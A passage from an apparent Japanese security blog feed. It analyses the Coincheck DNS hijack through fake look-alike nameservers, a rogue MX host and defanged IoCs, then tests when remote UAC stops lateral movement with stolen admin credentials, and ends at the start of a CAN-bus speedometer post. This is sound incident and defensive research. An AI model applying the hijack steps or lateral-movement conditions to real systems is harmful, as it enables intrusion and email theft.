&lt;p&gt;このドメイン名は、awsdnsの数字部に0が付加されており、&lt;strong&gt;AWSとは全く関係ありません。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;偽ネームサーバの調査&#34;&gt;偽ネームサーバの調査&lt;/h2&gt;
&lt;h3 id=&#34;レコード情報の取得&#34;&gt;レコード情報の取得&lt;/h3&gt;
&lt;p&gt;過去のwhois情報から判明した、2つの偽ネームサーバに対してANYクエリを送信し、coincheck.comのレコード情報を取得しました。&lt;/p&gt;
&lt;p&gt;下記は 偽ネームサーバ「awsdns-061」から取得した coincheck.com の偽レコード情報です。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;;; QUESTION SECTION:
;coincheck.com.                 IN      ANY

;; ANSWER SECTION:
coincheck.com.          33000   IN      SOA     ns-1985.awsdns-056[.]co.uk. ns-1515.awsdns-061[.]org. 2020050784 864000 72000 1209600 360000
coincheck.com.          360000  IN      NS      ns-1985.awsdns-056[.]co.uk.
coincheck.com.          360000  IN      NS      ns-1515.awsdns-061[.]org.
coincheck.com.          360000  IN      NS      ns-650.awsdns-017[.]net.
coincheck.com.          300     IN      A       54.192.85[.]80
coincheck.com.          60      IN      MX      10 aspmx2.googlemail.com.
coincheck.com.          60      IN      MX      10 aspmx3.googlemail.com.
coincheck.com.          60      IN      MX      5 alt2.aspmx.l.google.com.
coincheck.com.          60      IN      MX      1 aspmx.l.google.com.
coincheck.com.          60      IN      MX      5 alt1.aspmx.l.google.com.
coincheck.com.          300     IN      TXT     &amp;#34;facebook-domain-verification=la8geuy2tp70oh91bzf9qv80norcko&amp;#34;
coincheck.com.          300     IN      TXT     &amp;#34;atlassian-domain-verification=tTCWNrSNtNaqGqVPgZWhLMryhgrJD+iSmpgHI61+3D1Qv/zqWlrXgHJRWYymh+KT&amp;#34;
coincheck.com.          300     IN      TXT     &amp;#34;google-site-verification=9Vdf1PUnTUg7DQpW_amjVI_CLQAzBs4KpH58W1EBgew&amp;#34;
coincheck.com.          300     IN      TXT     &amp;#34;v=spf1 +include:servers.mcsv.net +include:amazonses.com +include:_spf.google.com ~all&amp;#34;
coincheck.com.          300     IN      TXT     &amp;#34;apple-domain-verification=HYRwkB7d1bV30n6U&amp;#34;
coincheck.com.          300     IN      TXT     &amp;#34;MS=ms23516971&amp;#34;

;; Query time: 252 msec
;; SERVER: 82.221.139[.]210#53(82.221.139[.]210)
;; WHEN: Wed Jun 03 00:37:47 JST 2020
;; MSG SIZE  rcvd: 800
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;基本的には現在正規のネームサーバが返すレコードと同じようにも見受けられますが、NSレコードが偽ネームサーバのドメイン名になっています。&lt;/p&gt;
&lt;p&gt;またNSレコードを見ると、awsdns-061、awsdns-056 の他に、 awsdns-&lt;strong&gt;0&lt;/strong&gt;17[.]net. というドメイン名も存在することがわかります。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;となると他にも正規のネームサーバである awsdns-50 に似せた awsdns-&lt;strong&gt;0&lt;/strong&gt;50 があるのではないかとwhoisを調査しましたが、存在しませんでした。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;これらのホストは 6/3 現在、以下のAレコードを持っています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ns-1985.awsdns-056[.]co.uk
&lt;ul&gt;
&lt;li&gt;172.104.114[.]87&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ns-1515.awsdns-061[.]org
&lt;ul&gt;
&lt;li&gt;82.221.139[.]210&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ns-650.awsdns-017[.]net.
&lt;ul&gt;
&lt;li&gt;45.77.9[.]110&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これらは全てホスティング会社のIPであり、もしかしたら攻撃者が用意したVPSかもしれません。&lt;/p&gt;
&lt;p&gt;なお、awsdns-056 、 awsdns-017 については名前解決のレスポンスが返ってきませんでした。&lt;/p&gt;
&lt;h3 id=&#34;whois情報&#34;&gt;whois情報&lt;/h3&gt;
&lt;p&gt;偽ネームサーバである３ホストはいずれも今年の 5/29 にドメイン名を登録しています。&lt;br&gt;
coincheck.comの正しいネームサーバに似せていることからも、攻撃者が今回の侵害のために登録した可能性が高いです。&lt;/p&gt;
&lt;h4 id=&#34;awsdns-056&#34;&gt;awsdns-056&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    Domain name:
        awsdns-056[.]co.uk
(snip)
    Relevant dates:
        Registered on: 29-May-2020
        Expiry date:  29-May-2021
        Last updated:  29-May-2020
(snip)
    Name servers:
        now1.dns.com
        now2.dns.com
    WHOIS lookup made at 18:53:24 02-Jun-2020
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;awsdns-061&#34;&gt;awsdns-061&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Domain Name: AWSDNS-061[.]ORG
(snip)
Updated Date: 2020-05-29T14:19:13Z
Creation Date: 2020-05-29T14:19:13Z
(snip)
Name Server: DNS1.SMOOTHDNS.COM
Name Server: DNS2.SMOOTHDNS.COM
(snip)
&amp;gt;&amp;gt;&amp;gt; Last update of WHOIS database: 2020-06-02T17:51:13Z &amp;lt;&amp;lt;&amp;lt;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;awsdns-017&#34;&gt;awsdns-017&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Updated Date: 2020-05-29T00:00:00Z
Creation Date: 2020-05-29T19:40:25Z
Registrar Registration Expiration Date: 2021-05-29T00:00:00Z
(snip)
Name Server: now1.dns.com
Name Server: now2.dns.com
(snip)
&amp;gt;&amp;gt;&amp;gt; Last update of WHOIS database: 2020-05-29T00:00:00Z &amp;lt;&amp;lt;&amp;lt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;メールの不正取得とmxレコードの調査&#34;&gt;メールの不正取得とMXレコードの調査&lt;/h2&gt;
&lt;p&gt;プレスリリースでは以下の文言があります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;本事象により、2020年5月31日～6月1日の期間にお客様からお問い合わせを頂いた一部のメールを第三者が不正に取得できる状態になっていたことが判明いたしました。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上記から、MXレコードが別ホストに向けられている可能性を考えます。&lt;/p&gt;
&lt;p&gt;現在の正しいMXレコードは以下です。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;coincheck.com.          86400   IN      MX      1 aspmx.l.google.com.
coincheck.com.          86400   IN      MX      10 aspmx2.googlemail.com.
coincheck.com.          86400   IN      MX      10 aspmx3.googlemail.com.
coincheck.com.          86400   IN      MX      5 alt1.aspmx.l.google.com.
coincheck.com.          86400   IN      MX      5 alt2.aspmx.l.google.com.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これと awsdns-061 からの偽応答を比べてみたところ、TTLを除いてどちらも同じ値でした。&lt;/p&gt;
&lt;p&gt;ただこの結果だけで、MXが侵害されていないと考えてはいけません。&lt;br&gt;
侵害発生時は偽のMXレコードになっていた可能性があり、現在の偽応答は既に攻撃者によって正しいMXレコードであるかのように隠蔽されているかもしれないためです。&lt;/p&gt;
&lt;p&gt;ここで、過去の coincheck.com のDNSレコードを調べることにします。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://securitytrails.com/&#34;&gt;SecurityTrails&lt;/a&gt;という過去のDNSレコードを検索できるサービスで検索したところ、以下の奇妙なMXレコードが存在していることがわかりました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mail.coincheck[.]com&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
  &lt;img src=&#34;./mx_history.png&#34; alt=&#34;mx_history&#34;&gt;
&lt;/p&gt;
&lt;p&gt;名前が存在する期間も 5/30 - 31 と、侵害された期間と一致しています。&lt;/p&gt;
&lt;p&gt;コインチェックは過去のDNSレコードを見る限り G Suiteのメールサービスを使っているため、5/30 に突然 G Suite ではない MXレコードが設定されるのは非常に怪しいです。&lt;/p&gt;
&lt;p&gt;これは攻撃者が不正なネームサーバに設定したMXレコードと考えるのが自然でしょう。&lt;/p&gt;
&lt;h2 id=&#34;偽メールサーバの調査&#34;&gt;偽メールサーバの調査&lt;/h2&gt;
&lt;p&gt;このホストに関する情報を調べます。偽ネームサーバに対してmail.coincheck[.]comのAレコードを問い合わせました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;;; QUESTION SECTION:
;mail.coincheck[.]com.            IN      A

;; ANSWER SECTION:
mail.coincheck[.]com.     300     IN      A       45.77.24[.]250

;; AUTHORITY SECTION:
coincheck.com.          360000  IN      NS      ns-650.awsdns-017[.]net.
coincheck.com.          360000  IN      NS      ns-1985.awsdns-056[.]co.uk.
coincheck.com.          360000  IN      NS      ns-1515.awsdns-061[.]org.

;; Query time: 256 msec
;; SERVER: 82.221.139[.]210#53(82.221.139[.]210)
;; WHEN: Wed Jun 03 02:00:48 JST 2020
;; MSG SIZE  rcvd: 200
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;予想通り、正規のネームサーバには存在しないAレコードが返ってきました。(AAAAレコードはなかった)&lt;/p&gt;
&lt;p&gt;このドメイン名は 45.77.24[.]250  という不審なホストと紐付いており、このホストで偽メールサーバが待ち受けていたと考えられます。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;このホストは Choopa LLC の子会社 Vultr というホスティング会社のVPSで、whois の結果から東京リージョンのマシンと思われます。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;なお現在も偽メールサーバは待ち受けていました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ telnet 45.77.24[.]250 25
Trying 45.77.24[.]250...
Connected to 45.77.24[.]250.
Escape character is &amp;#39;^]&amp;#39;.
&lt;/code&gt;&lt;/pre&gt;&lt;/br&gt;
&lt;p&gt;SMTPリクエストを送ってみます。&lt;/p&gt;
&lt;/br&gt;
&lt;p&gt;
  &lt;img src=&#34;./smtp.png&#34; alt=&#34;smtp&#34;&gt;
&lt;/p&gt;
&lt;p&gt;自身をcoincheck.comと偽っているようです。&lt;br&gt;
RCPT TOコマンドの動作から、宛先メールアドレスがcoincheck.comのときにのみ受信するようにしているみたいです。&lt;br&gt;
受信したメールを本来のcoincheck.comのメールサーバに転送しているかはここからは判断できませんでした。&lt;/p&gt;
&lt;h1 id=&#34;調査結果&#34;&gt;調査結果&lt;/h1&gt;
&lt;p&gt;これまでの調査から、あくまで&lt;strong&gt;推測ではあるものの&lt;/strong&gt;、&lt;br&gt;
攻撃者は以下のステップでメールの不正取得を行ったと考えます。&lt;/p&gt;
&lt;p&gt;　&lt;/br&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;「お名前.com Navi」の脆弱性を利用し、coincheck.comを管理している「お名前.com」のアカウントを奪取&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;正規のネームサーバに似せた不正なドメイン名を取得する&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不正なドメイン名に紐付けたホストにてDNSサーバを設定・起動する&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;お名前.comの設定画面で coincheck.com のネームサーバを偽ネームサーバに変更する&lt;/p&gt;
&lt;p&gt;この時点でドメインハイジャックに成功。&lt;br&gt;
この状態でコインチェック利用者がコインチェックにメールを送信するとき、&lt;br&gt;
以下のステップで攻撃者にメールが送信される*。&lt;/p&gt;
&lt;p&gt;　&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用者がメールを送信する&lt;br&gt;
MTAがコインチェックのメールサーバをキャッシュサーバに問い合わせる&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MTAが利用しているキャッシュサーバが名前解決をする&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不正なドメイン名に委任されているため、攻撃者の用意した偽ネームサーバが応答する&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;偽ネームサーバが、攻撃者が用意した偽メールサーバの情報を応答する&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MTAが偽メールサーバに対してメールを送信する&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;偽メールサーバが利用者からコインチェックへのメールを受信する&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;　&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;* 不正なネームサーバに誘導される条件として、利用者が使用しているDNSキャッシュサーバがcoincheck.comのキャッシュを持っていないこと&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;現在の正しいNSレコードのTTLは 172800 、つまり48時間に設定されていますが、当時も同様のTTLであった場合、ドメイン登録情報が改変されて修正されるまでに40時間ほど経過しているため、多くのキャッシュサーバは正しいネームサーバのキャッシュが切れ、偽ネームサーバに誘導された可能性があります。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;影響範囲について&#34;&gt;影響範囲について&lt;/h1&gt;
&lt;p&gt;今回はDNSのネームサーバを偽ホストに不正に変更されることでドメインハイジャックが成功し、メールの不正取得が行われました。&lt;/p&gt;
&lt;p&gt;6/1 20:52 にドメイン登録情報が修正されたことで問題から復旧したと考えたいところですが、場合によってはキャッシュサーバによるキャッシュによる影響が今後も続く可能性があります。&lt;/p&gt;
&lt;p&gt;時系列にしてみましょう。&lt;/p&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;05/31 00:05 ドメイン登録情報が不正なネームサーバに書き換えられる&lt;/p&gt;
&lt;p&gt;～この期間にキャッシュがない状態で名前解決した場合、不正応答をキャッシュする～&lt;br&gt;
(6/3時点で、偽ネームサーバが返すNSレコードのTTLは360000-&amp;gt;100時間)&lt;/p&gt;
&lt;p&gt;　&lt;/br&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;06/01 20:52 ドメイン登録情報が正しいネームサーバに修正される&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;06/04 04:05 不正なキャッシュがクリアされる最速の時間( 1. の直後から100時間経過)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;06/06 00:52 不正なキャッシュがクリアされる最遅の時間( 2. の直前から100時間経過)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;　&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;このように、偽ネームサーバが応答したNSのTTLが360000の場合、&lt;strong&gt;最大で 4. の 6/6 まで攻撃の影響が続いている可能性があります。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;コインチェックが全世界のキャッシュサーバのキャッシュをクリアすることは原理上不可能であるため、心配な利用者は coincheck.com の NS が攻撃者の用意した&lt;strong&gt;以下のドメイン名ではないこと&lt;/strong&gt;を確認した方がいいと思います。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ns-650.awsdns-017[.]net.&lt;/li&gt;
&lt;li&gt;ns-1985.awsdns-056[.]co.uk.&lt;/li&gt;
&lt;li&gt;ns-1515.awsdns-061[.]org.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;ioc&#34;&gt;IoC&lt;/h1&gt;
&lt;h2 id=&#34;domain-name&#34;&gt;Domain name&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ns-650.awsdns-017[.]net.&lt;/li&gt;
&lt;li&gt;ns-1985.awsdns-056[.]co.uk.&lt;/li&gt;
&lt;li&gt;ns-1515.awsdns-061[.]org.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ip-address&#34;&gt;IP Address&lt;/h2&gt;
&lt;p&gt;※下記IPアドレスは必ずしも不正ではない可能性があります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;172.104.114[.]87&lt;/li&gt;
&lt;li&gt;82.221.139[.]210&lt;/li&gt;
&lt;li&gt;45.77.9[.]110&lt;/li&gt;
&lt;li&gt;45.77.24[.]250&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;更新履歴&#34;&gt;更新履歴&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;2020年6月3日 15時 新規作成&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2020年6月4日  5時 「お名前.com」 のプレスリリースを受けて内容を追記&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2020年6月4日 20時 コインチェックの最終報のプレスリリースを受けて内容を追記・変更&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>コインチェックのドメインハイジャックの手法を調査した</title>
        <link>https://www.shutingrz.com/post/dig-coincheck/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>ラテラルムーブメントとそれを阻むUACに関する調査</title>
      <link>https://www.shutingrz.com/post/ad_remote-uac/</link>
      <pubDate>Mon, 24 Feb 2020 01:18:40 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/ad_remote-uac/</guid>
      <description>&lt;p&gt;ラテラルムーブメントを阻む、通称「リモートUAC」に関して調査しました。&lt;/p&gt;
&lt;p&gt;結果はまあそうだよねという感じになってしまいましたが、ここにメモします。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;share.png&#34; alt=&#34;image&#34;&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;uacの効果&#34;&gt;UACの効果&lt;/h1&gt;
&lt;p&gt;UAC といえば、管理者権限で実行するときに暗転して表示されるポップアップを連想されると思います。&lt;br&gt;
しかしUACには、管理共有やWMIなどの機能をリモートから防ぐためのリモート UAC という機能もあります。&lt;/p&gt;
&lt;p&gt;例えば組織内でセットアップ用のローカル管理者ユーザが存在しており、それが全端末でパスワードが同一だったとします。&lt;/p&gt;
&lt;p&gt;攻撃者がハッシュダンプを行いNTLM ハッシュを窃取すると、昔の Windows であれば それを用いてラテラルムーブメントをバンバン行い、侵害を拡大していきます。&lt;/p&gt;
&lt;p&gt;しかし Windows Vista 以降では UAC が搭載され、デフォルトの設定ではビルトイン管理者ではない限り管理共有やリモート実行ができなくなりました。&lt;/p&gt;
&lt;p&gt;と、ここで話が終わりますが、色々調べてみると情報が錯綜していて、ドメインユーザの場合は書いてないし、ドメイン管理者(Domain Admins)であれば無条件にできるなどの話もあってわけわからなくなったので、個人的に調査してみました。&lt;/p&gt;
&lt;h1 id=&#34;環境&#34;&gt;環境&lt;/h1&gt;
&lt;h3 id=&#34;マシン&#34;&gt;マシン&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ドメインコントローラ (Windows Server 2016)&lt;/li&gt;
&lt;li&gt;クライアントA (Windows10 - 1809)
&lt;ul&gt;
&lt;li&gt;ローカル Administrators から Domain Admins を削除&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;クライアントB (Windows 7  - SP2)&lt;/li&gt;
&lt;li&gt;クライアントC (Windows10 - 1909)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;アカウント&#34;&gt;アカウント&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;alice (Domain Admins)&lt;/li&gt;
&lt;li&gt;bob (Domain User)&lt;/li&gt;
&lt;li&gt;chalie (Domain User。そして全端末のローカル Administratorsに所属)&lt;/li&gt;
&lt;li&gt;user ( 全クライアントで有効なローカルユーザ。Administrators に所属 / NOT Built-in)&lt;/li&gt;
&lt;li&gt;Administrator (全端末で有効なローカルユーザ。 Built-in Administrators)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;※ローカルユーザである user と Administrators は&lt;strong&gt;全端末でパスワードを同一にしています&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;これらの環境において、runas を使って検証を行いました。&lt;/p&gt;
&lt;h1 id=&#34;結果&#34;&gt;結果&lt;/h1&gt;
&lt;p&gt;以下のようになりました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ローカル/ドメイン関係なくユーザ(グループ)がローカル管理者に属していない場合、管理共有やWMIなどのリモート実行はできない。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Domain Admins所属のドメインユーザでもDomain Adminsをローカル管理者から外せばできなくなる&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ローカル管理者であるビルトインではないローカルユーザは、リモートUACが有効だと管理共有・リモート実行はできない。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ローカル管理者であるビルトイン Administrator は、リモートUACが有効でも管理共有・リモート実行は&lt;strong&gt;できる&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ローカル管理者であるドメインユーザは、リモートUACが有効でも管理共有・リモート実行は&lt;strong&gt;できる&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows7、Windows10、Windows Server 2016 (ドメインコントローラ) で同じ仕様。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;以下は早見表です。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ユーザ種別と標的マシン上の権限&lt;/th&gt;
&lt;th&gt;リモートUAC有効&lt;sup&gt;*2&lt;/sup&gt;&lt;/th&gt;
&lt;th&gt;リモートUAC無効&lt;sup&gt;*3&lt;/sup&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ドメイン/ローカルユーザ (&lt;strong&gt;NOT&lt;/strong&gt; Local Administrators&lt;sup&gt;*1&lt;/sup&gt;)&lt;/td&gt;
&lt;td&gt;Not Accessible&lt;/td&gt;
&lt;td&gt;Not Accessible&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Domain Admins ( &lt;strong&gt;NOT&lt;/strong&gt; Local Administrators&lt;sup&gt;*4&lt;/sup&gt;)&lt;/td&gt;
&lt;td&gt;Not Accessible&lt;/td&gt;
&lt;td&gt;Not Accessible&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ローカルユーザ (Local Administrators)&lt;/td&gt;
&lt;td&gt;Not Accessible&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Accessible&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;ビルトイン&lt;/strong&gt; Administrator (Local Administrators)&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Accessible&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Accessible&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ドメインユーザ (Local Administrators)&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Accessible&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Accessible&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;※1: Local Administrators : 標的マシンの ローカルグループである Administrators に属していること&lt;br&gt;
※2: リモートUAC有効というのは、「HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System」配下のキーが&lt;strong&gt;以下であること(AND)&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LocalAccountTokenFilterPolicy が 0 あるいはキーが存在しない&lt;/li&gt;
&lt;li&gt;EnableLUA が 1 (→UACが有効)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;※3: リモートUAC無効というのは、キーが以下の &lt;strong&gt;いずれか(OR)&lt;/strong&gt; であること。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LocalAccountTokenFilterPolicy が 1&lt;/li&gt;
&lt;li&gt;EnableLUA が 0 (→UACそのものが無効)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;※4: 普通ならマシンがドメインに参加した時点で Domain Admins グループが Local Administrators に追加されるが、明示的にそれを削除した場合。&lt;/p&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;リモートUACはビルトインではない&amp;quot;ローカルユーザ&amp;quot;に対して攻撃を無効化できるだけで、ビルトイン Administrator、そしてドメインユーザがローカル管理者であった場合は、リモートUACの効果がないことがわかります。&lt;/p&gt;
&lt;p&gt;よってセットアップ用に1つのドメインユーザが全端末のローカル管理者に設定されていた場合、そのユーザの認証情報を手に入れることができたらリモートUACがあってもラテラルムーブメントは可能です。&lt;/p&gt;
&lt;/br&gt;
&lt;p&gt;なお Domain Adminsであれば無条件に管理共有・リモート実行が可能という話があるのは、マシンがドメインに参加したときにローカル Administrators に Domain Admins が追加されているからでしょう。&lt;br&gt;
あえてローカルAdministrators から Domain Admins を削除してしまえば、Domain Admins所属ユーザは一般ユーザと同じく標的マシンに対して管理共有・リモート実行はできなくなります。&lt;br&gt;
つまり Domain Admins というグループそのものにUACをバイパスして管理共有・リモート実行ができるという機能があるわけではないです。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ペンテストに関する文献を読んでも、ここらへんに関するしっかりとした記述があまり見当たらないのなぜ・・・。&lt;br&gt;
これが理解できないと現在Overpass-the-hash が使われている理由の説明がしづらくなる気がします。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ユーザー アカウント制御、Windows Vista でリモートの制限の説明&lt;br&gt;
&lt;a href=&#34;https://support.microsoft.com/ja-jp/help/951016/description-of-user-account-control-and-remote-restrictions-in-windows&#34;&gt;https://support.microsoft.com/ja-jp/help/951016/description-of-user-account-control-and-remote-restrictions-in-windows&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Administrative share&lt;br&gt;
&lt;a href=&#34;https://en.wikipedia.org/wiki/Administrative_share&#34;&gt;https://en.wikipedia.org/wiki/Administrative_share&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Pass the Hash&lt;br&gt;
&lt;a href=&#34;https://en.hackndo.com/pass-the-hash/&#34;&gt;https://en.hackndo.com/pass-the-hash/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>ラテラルムーブメントとそれを阻むUACに関する調査</title>
        <link>https://www.shutingrz.com/post/ad_remote-uac/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>アクアのスピードメーターを解析してPS3のコントローラで動かす</title>
      <link>https://www.shutingrz.com/post/aqua-meter-hack/</link>
      <pubDate>Thu, 03 Oct 2019 04:34:00 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/aqua-meter-hack/</guid>
      <description>&lt;p&gt;しゅーとです。&lt;br&gt;
リアルECUシリーズ第二作目。&lt;/p&gt;
&lt;p&gt;ヤフオクにてアクアのコンビネーションメータを手に入れたので色々いじってみた。&lt;/p&gt;
&lt;h1 id=&#34;要約&#34;&gt;要約&lt;/h1&gt;
&lt;p&gt;スピードメーターが反応するCANIDを特定できた。&lt;br&gt;
そしてその情報を使ってPS3コントローラでスピードメーターを操作してみたよ。&lt;/p&gt;
&lt;p&gt;コントローラで動いているのだけ見たい人はこの動画を見てください。&lt;/p&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/5ZJSc0vtP5E&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;

&lt;hr&gt;
&lt;h1 id=&#34;検証環境&#34;&gt;検証環境&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;DC安定化電源
&lt;ul&gt;
&lt;li&gt;メーターへの給電用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Canable
&lt;ul&gt;
&lt;li&gt;CAN通信ができるUSB機器。(ファームウェアは candlelight に更新済み)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ジャンパワイヤ
&lt;ul&gt;
&lt;li&gt;メーターの IG+, GND, CAN-H, CAN-L に用いるので最低4本必要&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ちなみに我が家のCANの検証環境は画像のような感じ。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;car_env.png&#34; alt=&#34;car_env&#34;&gt;
&lt;/p&gt;
&lt;p&gt;CANだけであれば、電源・GNDと、CANバスとみなしたブレッドボード2ライン分を用意するだけで検証が可能。&lt;/p&gt;
&lt;p&gt;これだけなら結構すぐ始められる。みんなも始めよう！&lt;/p&gt;
&lt;h2 id=&#34;コンビネーションメーターの仕様&#34;&gt;コンビネーションメーターの仕様&lt;/h2&gt;
&lt;ul&gt;
